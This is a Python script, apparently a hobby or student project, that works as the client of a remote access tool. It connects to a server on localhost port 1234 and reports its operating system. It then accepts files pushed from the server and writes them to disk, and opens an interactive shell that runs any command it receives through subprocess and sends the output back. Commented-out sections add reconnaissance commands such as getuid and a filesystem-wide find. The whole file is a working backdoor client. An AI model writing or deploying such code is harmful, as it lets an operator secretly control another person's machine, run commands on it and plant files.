import socket
import subprocess
import os


# def recv_all(sock, length):
#     data = b''
#     while len(data) < length:
#         more = sock.recv(length - len(data))
#         if not more:
#             raise EOFError(
#                 'Expected %d bytes but only received %d bytes before the socket closed' % (length, len(data)))
#         data += more
#     return data


def connect_to_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 1234))

    # get on which OS the client is running
    s.send(os.name.encode('utf-8'))

    while True:
        command = s.recv(1024).decode('utf-8')
        if command.lower() == "close":
            break

        if command.lower().startswith("upload"):
            # format filename
            file_path = command.split(" ")[1]
            if '/' in file_path:
                filename = file_path.split("/")[-1]
            elif '\\' in file_path:
                filename = file_path.split("\\")[-1]
            else:
                filename = file_path

            print(f"Downloading {filename}...")

            # Recevoir la taille du fichier (8 octets)
            file_size = int.from_bytes(s.recv(8), 'big')
            print(f"Expected file size: {file_size} bytes")

            # Recevoir le fichier en morceaux de 1024 octets
            with open(filename, "wb") as file:
                received = 0
                while received < file_size:
                    chunk = s.recv(min(1024, file_size - received))
                    if not chunk:
                        raise EOFError('Connection closed before receiving all the data')
                    file.write(chunk)
                    received += len(chunk)
                    # calculate progress
                    progress = str(round(((received / file_size) * 100)))
                    s.send(progress.encode('utf-8'))

            print("File uploaded successfully")
            s.send(b"File uploaded successfully")

        if command.lower() == "shell":
            print("Shell opened")

            while True:
                command = s.recv(1024).decode('utf-8')
                print(command)

                if command.startswith("cd"):
                    try:
                        new_path = command.split(" ")[1]
                        if not os.path.exists(new_path):
                            s.send("Directory does not exist".encode('utf-8'))
                        else:
                            os.chdir(command.split(" ")[1])
                            s.send("Directory changed".encode('utf-8'))
                    except IndexError:
                        s.send("No directory specified".encode('utf-8'))
                        continue
                    continue

                if command.lower() == "exit":
                    s.send("End of Shell.".encode('utf-8'))
                    break

                output = subprocess.getoutput(command)
                if not output:
                    output = "No output"
                s.send(output.encode('utf-8'))
        #
        #
        # if command.lower() == "getuid":
        #     output = subprocess.getoutput(command.lower())
        #     s.send(output.encode('utf-8'))
        #
        # if command.lower() == "ipconfig":
        #     output = subprocess.getoutput("ip a")
        #     s.send(output.encode('utf-8'))
        #
        # if command.lower() == "ls":
        #     output = subprocess.getoutput("ls")
        #     s.send(output.encode('utf-8'))
        #
        # if command.lower() == "pwd":
        #     output = subprocess.getoutput("pwd")
        #     s.send(output.encode('utf-8'))
        #
        # if command.lower().startswith("search"):
        #     searched_file = command.split(" ")[1]
        #     print(f"Searching for {searched_file}...")
        #     output = subprocess.getoutput(f"find / -name {searched_file} 2>/dev/null")
        #     s.send(output.encode('utf-8'))

        # print(f"Executing command: {command}")
        else:
            output = subprocess.getoutput(command.lower())
            s.send(output.encode('utf-8'))

    s.close()


if __name__ == "__main__":
    connect_to_server()
